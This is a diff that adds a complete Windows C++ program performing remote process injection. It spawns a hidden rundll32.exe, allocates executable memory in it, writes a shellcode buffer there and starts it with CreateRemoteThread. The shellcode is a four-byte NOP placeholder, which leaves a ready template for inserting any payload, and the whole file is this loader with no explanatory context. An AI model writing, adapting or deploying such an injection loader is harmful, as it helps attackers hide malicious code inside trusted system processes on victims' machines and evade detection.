@@ -1,0 +1,73 @@
+#include <windows.h>
+#include <tlhelp32.h>
+#include <iostream>
+
+unsigned char shellcode[] = {
+    0x90, 0x90, 0x90, 0x90 
+};
+
+int main() {
+    STARTUPINFO si = { 0 };
+    PROCESS_INFORMATION pi = { 0 };
+    si.cb = sizeof(si);
+
+    if (!CreateProcessA(
+        "C:\\Windows\\System32\\rundll32.exe",
+        NULL, NULL, NULL, FALSE,
+        CREATE_NO_WINDOW,
+        NULL, NULL,
+        &si, &pi))
+    {
+        std::cerr << "CreateProcess failed. Error: " << GetLastError() << "\n";
+        return 1;
+    }
+
+    Sleep(1000);
+
+    LPVOID remoteMemory = VirtualAllocEx(
+        pi.hProcess,
+        NULL,
+        sizeof(shellcode),
+        MEM_COMMIT | MEM_RESERVE,
+        PAGE_EXECUTE_READWRITE);
+
+    if (!remoteMemory) {
+        std::cerr << "VirtualAllocEx failed. Error: " << GetLastError() << "\n";
+        return 1;
+    }
+
+    if (!WriteProcessMemory(
+        pi.hProcess,
+        remoteMemory,
+        shellcode,
+        sizeof(shellcode),
+        NULL))
+    {
+        std::cerr << "WriteProcessMemory failed. Error: " << GetLastError() << "\n";
+        return 1;
+    }
+
+    HANDLE remoteThread = CreateRemoteThread(
+        pi.hProcess,
+        NULL,
+        0,
+        (LPTHREAD_START_ROUTINE)remoteMemory,
+        NULL,
+        0,
+        NULL);
+
+    if (!remoteThread) {
+        std::cerr << "CreateRemoteThread failed. Error: " << GetLastError() << "\n";
+        return 1;
+    }
+
+    std::cout << "[+] Shellcode executed in rundll32.exe!\n";
+
+    WaitForSingleObject(remoteThread, INFINITE);
+
+    CloseHandle(remoteThread);
+    CloseHandle(pi.hProcess);
+    CloseHandle(pi.hThread);
+
+    return 0;
+}
